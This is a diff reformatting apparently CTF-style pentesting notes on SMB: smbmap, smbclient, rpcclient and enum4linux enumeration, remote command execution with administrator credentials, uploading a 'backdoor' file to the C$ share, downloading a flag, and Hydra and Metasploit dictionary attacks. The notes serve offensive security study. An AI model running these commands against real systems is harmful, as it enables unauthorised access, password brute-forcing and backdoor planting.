@@ -102,6 +102,7 @@ smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=passw
  
 # SMBMap
 
+## SMBMap with Null Session
 ```
 smbmap -u username -p "" -d . -H IP_addr
 ```
@@ -109,23 +110,19 @@ smbmap -u username -p "" -d . -H IP_addr
 - -d = directory to see
 - -H = Host IP address
 
-```
-smbmap -u administrator -p password -H IP_addr -x "ipconfig"
-```
-- -x = command to execute
-  
-### Getting SMB connection:
+
+## SMBMap with Credentials
 ```
 smbmap -u administrator -p password -H IP_addr -L
-```
-- -L = List out the contents of different drives
-
-```
+smbmap -u administrator -p password -H IP_addr -x "ipconfig"
 smbmap -u administrator -p password -H IP_addr -r 'C$'
 ```
+- -L = List of the contents of different drives
+- -x = command to execute
 - -r = listing a drive content
 
-### Uploading file to target device
+
+## Uploading file to target device
 - Create a file (i.e. 'backdoor') in the attacker's device
 ```
 touch backdoor
@@ -138,7 +135,9 @@ smbmap -u administrator -p password -H IP_addr --upload "/root/backdoor" "C$\bac
 ```
 smbmap -u administrator -p password -H IP_addr -r "C$"
 ```
-### Downloading file from target device
+
+
+## Downloading file from target device
 ```
 smbmap -u administrator -p password -H IP_addr --download "C$\flag.txt"
 ```
@@ -147,7 +146,6 @@ smbmap -u administrator -p password -H IP_addr --download "C$\flag.txt"
 
 # smbclient Connection with Null Session
 
-### smbclient 
 ```
 smbclient -h
 smbclient -L IP_addr -N
@@ -157,12 +155,11 @@ smbclient -L IP_addr -N
 
 
 # rpcclient Connection with Null Session
-### rpcclient:
 	rpcclient -h
 	rpcclient -U "" -N IP_addr
- - -N= No password = Null session
+- -N= No password = Null session
 
-### After connecting to rpcclient:
+## After connecting with rpcclient:
 	? 		  	<<< help
 	srvinfo
 	enumdomusers  	        <<< getting user list
@@ -174,20 +171,20 @@ smbclient -L IP_addr -N
 # SMB Dictionary Attack
 
 
-### Metasploit
+## Metasploit
 - auxiliary/scanner/smb/smb_login
 	- wordlist >> /usr/share/wordlists/metasploit/unix_passwords.txt
 
-### Hydra
+## Hydra
 - hydra -l admin -P /usr/share/wordlists/rockyou.txt IP_addr smb 
 
 
-### smbmap     >> Login Access
+## smbmap     >> Login Access
 ```
 smbmap -H IP-addr -u admin -P password
 ```
 
-### smbclient  >> Login Access
+## smbclient  >> Login Access
 ```
 smbclient -L IP_addr -U username
 ```
@@ -212,7 +209,7 @@ auxiliary/scanner/smb/pipe_auditor
 ```
 enum4linux -r -u "admin" -p "password" IP_addr
 ```
-	-r = User's SID
+- -r = User's SID
 
 
 
